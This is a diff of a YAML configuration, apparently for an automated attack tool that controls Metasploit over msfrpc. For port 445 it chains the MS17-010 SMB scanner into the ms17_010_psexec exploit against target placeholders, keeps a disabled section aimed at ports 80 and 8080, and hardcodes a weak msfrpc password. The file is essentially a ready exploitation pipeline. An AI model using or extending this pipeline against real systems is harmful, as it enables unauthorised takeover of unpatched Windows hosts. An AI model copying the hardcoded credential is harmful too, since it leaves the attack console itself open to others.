@@ -1,23 +1,38 @@
+#<RPORT> - заменится на порт который указан выше
+
 msfrpc:
     password: 123123
 
 ports:
     445:
-        pre-modules: 123
+        pre-modules:
+                - auxiliary/scanner/smb/smb_ms17_010:
+                        raiting: 5.0
+                        commands:
+                                - RHOSTS: <RHOSTS>
+                                - RPORT: <RPORT>
+
         main-modules:
                 - exploit/windows/smb/ms17_010_psexec:
                         raiting: 5.0
                         commands:
-                                - set RHOST <RHOST>
-                                - run
+                                - RHOST: <RHOST>
+                                - RPORT: <RPORT>
+
         post-modules: null
 
-    80,8080:
-        pre-modules: null
-        main-modules:
-                - exploit/windows/smb/ms17_010_psexec:
-                        raiting: 5.0
-                        commands:
-                                - set RHOST <RHOST>
-                                - run
-        post-modules: null
+#    80,8080:
+#        pre-modules:
+#                - auxiliary/scanner/smb/smb_ms17_010:
+#                        raiting: 5.0
+#                        commands:
+#                                - RHOSTS: <RHOSTS>
+#                                - RPORT: <RPORT>
+#
+#        main-modules:
+#                - exploit/windows/smb/ms17_010_psexec:
+#                        raiting: 5.0
+#                        commands:
+#                                - RHOST: <RHOST>
+#                                - RPORT: <RPORT>
+#        post-modules: null
